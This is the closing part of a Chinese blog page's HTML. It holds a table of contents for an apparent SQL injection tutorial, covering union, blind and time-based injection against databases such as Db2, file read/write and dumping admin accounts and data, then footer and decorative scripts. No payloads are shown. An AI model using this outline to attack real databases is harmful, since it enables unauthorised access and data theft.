class="toc-text">猜列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜字段内容长度"><span class="toc-text">猜字段内容长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜字段内容"><span class="toc-text">猜字段内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#时间盲注"><span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写文件"><span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读文件"><span class="toc-text">读文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Db2数据库"><span class="toc-text">Db2数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#爆数据库版本"><span class="toc-text">爆数据库版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆当前用户"><span class="toc-text">爆当前用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆当前用户的权限"><span class="toc-text">爆当前用户的权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取数据库权限"><span class="toc-text">获取数据库权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆数据库的管理员账户"><span class="toc-text">爆数据库的管理员账户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆数据库所在主机相关信息"><span class="toc-text">爆数据库所在主机相关信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆当前数据库"><span class="toc-text">爆当前数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆当前数据库的表"><span class="toc-text">爆当前数据库的表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#返回所有用户创建的表名"><span class="toc-text">返回所有用户创建的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#返回第一条记录"><span class="toc-text">返回第一条记录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆当前数据库的列名"><span class="toc-text">爆当前数据库的列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union联合注入-1"><span class="toc-text">union联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段数-1"><span class="toc-text">爆字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆当前数据库-1"><span class="toc-text">爆当前数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表名-1"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆列名-1"><span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段数据"><span class="toc-text">爆字段数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#猜用户名字长度"><span class="toc-text">猜用户名字长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜用户名"><span class="toc-text">猜用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆当前数据库名长度"><span class="toc-text">爆当前数据库名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆当前数据库名-1"><span class="toc-text">爆当前数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜用户表的数量"><span class="toc-text">猜用户表的数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜表的长度"><span class="toc-text">猜表的长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜表名-1"><span class="toc-text">猜表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜列名数量"><span class="toc-text">猜列名数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜列名长度-1"><span class="toc-text">猜列名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜列名-1"><span class="toc-text">猜列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜字段内容长度-1"><span class="toc-text">猜字段内容长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜字段内容-1"><span class="toc-text">猜字段内容</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
